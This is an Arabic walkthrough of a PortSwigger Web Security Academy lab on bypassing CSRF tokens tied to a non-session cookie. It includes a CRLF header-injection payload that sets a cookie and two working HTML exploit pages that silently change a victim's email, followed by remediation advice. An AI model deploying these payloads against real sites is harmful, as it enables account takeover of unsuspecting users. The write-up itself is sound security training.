# [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
نقوم بتسجيل الدخول إلى حساب `wiener:peter`، ونقوم بعمل تغيير البريد الإلكتروني وإعتراض الـ `request`
```http
POST /my-account/change-email HTTP/2
Host: 0a46000e0393c1fa809f2b5b005300b5.web-security-academy.net
Cookie: csrfKey=aH7fZIec0i1YLlTxuWWHEKoSK6pIapAj; session=e4Bo9nK8rsbHcjWVX1dnGOqNH4Zjg7HC

email=admin%40dontwannacry.com&csrf=8y4yfWUzqZIYQ7VLgVOeYveuG33TyxdM
```

ونقوم بنسخ الـ `csrfkey` و الـ `CSRF token`، بعد ذلك إذا قمنا بإستخدام خاصية البحث في الموقع بكلمة `test` كمثال

```http
GET /?search=test HTTP/2
Host: 0a46000e0393c1fa809f2b5b005300b5.web-security-academy.net
Cookie: csrfKey=aH7fZIec0i1YLlTxuWWHEKoSK6pIapAj; session=SeuLj2traSrrKk2gOg0ptK8NC49yKcPX
```

فسنلاحظ في الإستجابة أنه تم وضع `cookie` جديد باسم `LastSearchTerm
`
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6972
```

وإذا قمنا بتجربة لاستخدام التالي ككلمة للبحث : `test%0d%0aSet-Cookie:%20csrfKey=test`
فسنلاحظ في الإستجابة أنه قد تم وضع قم تم وضع `cookie` جديد باسم `csrfkey` قيمته تساوى `test` هذ يعنى أنه يمكن استعمال هذه الثغرة لحقن الـ `cookie` في حساب الضحية.

**`خطوة إختيارية:`** بسبب أن هذا لاب فنحن نعلم بوجود الثغرة بالفعل ولكن إكتشاف هذه الثغرة في الواقع عند اختبار موقع حقيقي ستحتاج للدخول إلى حساب أخر تمتلكه لتختبر عدة فرضيات مثل هل الـ `csrf token` مرتبط بالـ `csrf key` فقط أم مرتبط بحساب المستخدم كذلك وعدة فرضيات أخرى ولذلك فهذا اللاب يوفر لك حساب أخر وهو `carlos:montoya` حتى تختبر هذه الفرضيات إذا أردت ذلك.

وبعد ذلك نقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع إحدى السكريبتات التالية في خانة `Body`.
```html
<form method="POST" action="https://0a46000e0393c1fa809f2b5b005300b5.web-security-academy.net/my-account/change-email"> 
    <input type="hidden" name="email" value="test@test.com"> 
    <input type="hidden" name="csrf" value="8y4yfWUzqZIYQ7VLgVOeYveuG33TyxdM"> 
</form> 
<img src="https://0a46000e0393c1fa809f2b5b005300b5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=aH7fZIec0i1YLlTxuWWHEKoSK6pIapAj%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://0a46000e0393c1fa809f2b5b005300b5.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="test3&#64;test&#46;ca" />
<input type="hidden" name="csrf" value="8y4yfWUzqZIYQ7VLgVOeYveuG33TyxdM" />
<input type="submit" value="Submit request" />
</form>
<img src="https://0a46000e0393c1fa809f2b5b005300b5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=aH7fZIec0i1YLlTxuWWHEKoSK6pIapAj" onerror="document.forms[0].submit()">
</body>
</html>
```

بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`بالإضافة إلى جزء كبير من ترقيع لاب` [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

فيجب على السيرفر تعقييم أي مدخلات من المستخدم قبل تمريرها إلى ترويسات الاستجابة، بحيث يتم إزالة أو استبدال رموز `%0d` و `%0a` (أو `\r` و `\n`).
 
ويجب تحديث إطار العمل فأغلب لغات البرمجة وأطر العمل الحديثة تمنع وضع هذه الرموز في الـ `Headers` وتُصدر خطأ برمجياً تلقائياً إذا حاول المطور فعلًا لذلك يجب التأكد من استخدام نسخ حديثة ومحدثة من بيئة التطوير يحل المشكلة غالباً.

ويجب إلغاء الـ `csrfkey` إن أمكن فالاعتماد على تخزين الـ Token في قاعدة بيانات الجلسات على السيرفر ومقارنته بما يرسله المستخدم في الـ `Form` هو الطريقة الأكثر أماناً وموثوقية.

وإذا كان ولابد من استعمال الـ `csrfkey` فيجب ألا يكون مجرد نص عشوائي، بل يجب أن يكون موقعاً بتشفير `HMAC` باستخدام مفتاح سري لا يملكه إلا السيرفر، وأن يتم دمج الـ `Session ID` داخل الـ `csrfKey` قبل تشفيره.
